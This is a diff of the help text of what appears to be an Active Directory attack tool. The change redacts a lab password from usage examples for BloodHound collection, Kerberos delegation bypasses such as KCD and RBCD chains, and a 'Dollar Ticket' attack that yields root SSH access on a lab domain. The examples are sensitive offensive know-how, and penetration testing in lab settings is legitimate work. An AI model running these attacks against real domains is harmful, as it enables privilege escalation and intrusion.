@@ -9863,7 +9863,7 @@ def parse_args() -> Config:
           %(prog)s -u jsmith -p 'P@ss' --unicode-spn
 
           # BloodHound collection + automatic high-value analysis
-          %(prog)s -u sunfyre -p 'BSno5DP4tjJ4jIu8is3B' -d dracarys.lab \\
+          %(prog)s -u sunfyre -p '...' -d dracarys.lab \\
                    --dc-fqdn BALERION.dracarys.lab --dc-ip 192.168.56.10 --phase bloodhound
 
           # KCD protocol-transition bypass: rewrite TGS sname (tgssub-style)
@@ -9873,7 +9873,7 @@ def parse_args() -> Config:
 
           # Dollar Ticket — TGT for 'root' via auto-created root$ machine acct
           # (target a domain-joined Linux box for GSSAPI SSH login as root)
-          %(prog)s -u sunfyre -p 'BSno5DP4tjJ4jIu8is3B' -d dracarys.lab \\
+          %(prog)s -u sunfyre -p '...' -d dracarys.lab \\
                    --phase dollar-ticket --target-user root
 
           # RBCD+KCD chain — full ghost-SPN + RBCD + altservice rewrite, in one shot
